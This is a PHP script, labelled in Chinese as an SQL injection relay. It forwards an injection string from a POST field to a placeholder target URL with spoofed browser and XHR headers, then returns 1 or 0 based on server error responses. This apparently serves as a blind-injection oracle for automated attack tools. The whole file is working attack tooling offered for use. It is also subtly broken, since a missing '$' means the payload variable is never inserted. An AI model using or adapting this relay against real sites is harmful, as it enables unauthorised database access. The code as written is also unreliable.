<?php
// 注入中转脚本
set_time_limit(0);
$inject_sql = $_POST['checked'];
$host ='http://xxx/xxx';
$content = "begin" . inject_sql .'end';
$header = array("Content-Type: application/x-www-form-urlencoded",
    "X-Requested-With: XMLHttpRequest",
    "User-Agent: Mozilla/5.0 (X11; U; Linux i686; fr; rv:1.8.1.4) Gecko/20070515 Firefox/2.0.0.4",
    "Content-Length: ".strlen($content));
$ch = curl_init();
curl_setopt($ch, CURLOPT_URL, $host);
curl_setopt($ch, CURLOPT_HTTPHEADER, $header);
curl_setopt($ch, CURLOPT_POST, 1);
curl_setopt($ch, CURLINFO_HEADER_OUT, TRUE);
curl_setopt($ch, CURLOPT_POSTFIELDS, $content);
curl_setopt($ch, CURLOPT_RETURNTRANSFER, TRUE);
$result=curl_exec($ch);
//print_r($result);
curl_close($ch);
if(strstr($result, "string")){
    echo "error";
}else if(strstr($result, "500")){
    echo 1;
}else{
    echo 0;
}
?>